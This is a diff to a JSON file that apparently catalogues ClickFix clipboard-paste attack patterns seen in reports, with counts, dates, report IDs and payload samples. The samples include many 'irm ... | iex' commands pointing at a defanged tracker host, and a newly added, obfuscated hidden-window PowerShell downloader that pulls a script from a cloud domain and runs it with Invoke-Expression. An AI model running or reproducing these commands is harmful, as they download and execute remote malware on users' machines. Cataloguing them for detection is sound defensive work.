@@ -1,10 +1,10 @@
 [
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 79,
-    "ReportCount": 79,
+    "DistinctPayloadCount": 80,
+    "ReportCount": 80,
     "FirstSeen": "2026-11-20T02:55:20.673000+00:00",
-    "LastSeen": "2026-11-26T20:26:33.895000+00:00",
+    "LastSeen": "2026-11-27T02:16:57.951000+00:00",
     "ReportIds": [
       "cmwodzfal1z0v0omlds2tteaj",
       "cmwodzv5l1z250omlqi1hs6dh",
@@ -84,7 +84,8 @@
       "cmwxozekr0ff00oml1mrfdppx",
       "cmwxpfxxr0fi30omlvtp74p8o",
       "cmwxzs7ov0fty0omll0s1pyq1",
-      "cmwy06ewh0g780omlgqj6ta51"
+      "cmwy06ewh0g780omlgqj6ta51",
+      "cmwycp15s0gqa0omljaybbqdc"
     ],
     "PayloadExamples": [
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/023cf003bfe9c9b9')|iex",
@@ -135,6 +136,7 @@
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/eb7996060e99801d')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/ef9c80bd652ab34d')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/ffff876c5cca644d')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/Girya/210e4824f07bc460')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/Girya/8b1b5218aa56b2b4')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/Girya/a5e49da2eb6f1960')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/Girya/c0f2f5011d866ebe')|iex",
@@ -631,6 +633,19 @@
     ],
     "PayloadExamples": [
       "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell..."
+    ]
+  },
+  {
+    "Pattern": "$kh='htt...\n...101, 108, 108, 46, 101, 120, 101, 32, 45, 119, 32, 104, 32, 45, 110, 111, 112, 32, 45, 99, 32], // powershell.exe -w h -nop -c [34, 36, 107, 104, 61, 39, 104, 116, 116, 112, 39, 43, 39, 115, 39, 59], // \"$kh='htt...\n...101, 108, 108, 46, 101, 120, 101, 32, 45, 119, 32, 104, 32, 45, 110, 111, 112, 32, 45, 99, 32], // powershell.exe -w h -nop -c [34, 36, 107, 104, 61, 39, 104, 116, 116, 112, 39, 43, 39, 115, 39, 59], // \"$kh='htt...\n...a) { window.clipboardData.setData('Text', command); } }); <!-- clickfix-observer-corpus --> powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/';\"$c='cVG'+'vQi'+'o6'+'.txt'...\n...Net.','Web','Client';\"$rf=New-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression $kj\" powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/';\"$c='cVG'+'vQi'+'o6'+'.txt'...\n...Net.','Web','Client';\"$rf=New-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression $kj\" powershell.exe -w h -nop -c powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/'...\n...w-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-27T02:09:02.857000+00:00",
+    "LastSeen": "2026-11-27T02:09:02.857000+00:00",
+    "ReportIds": [
+      "cmwyceukd0gn60omlmkcltw7a"
+    ],
+    "PayloadExamples": [
+      "$kh='htt...\n...101, 108, 108, 46, 101, 120, 101, 32, 45, 119, 32, 104, 32, 45, 110, 111, 112, 32, 45, 99, 32], // powershell.exe -w h -nop -c [34, 36, 107, 104, 61, 39, 104, 116, 116, 112, 39, 43, 39, 115, 39, 59], // \"$kh='htt...\n...101, 108, 108, 46, 101, 120, 101, 32, 45, 119, 32, 104, 32, 45, 110, 111, 112, 32, 45, 99, 32], // powershell.exe -w h -nop -c [34, 36, 107, 104, 61, 39, 104, 116, 116, 112, 39, 43, 39, 115, 39, 59], // \"$kh='htt...\n...a) { window.clipboardData.setData('Text', command); } }); <!-- clickfix-observer-corpus --> powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/';\"$c='cVG'+'vQi'+'o6'+'.txt'...\n...Net.','Web','Client';\"$rf=New-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression $kj\" powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/';\"$c='cVG'+'vQi'+'o6'+'.txt'...\n...Net.','Web','Client';\"$rf=New-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression $kj\" powershell.exe -w h -nop -c powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/'...\n...w-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression"
     ]
   },
   {
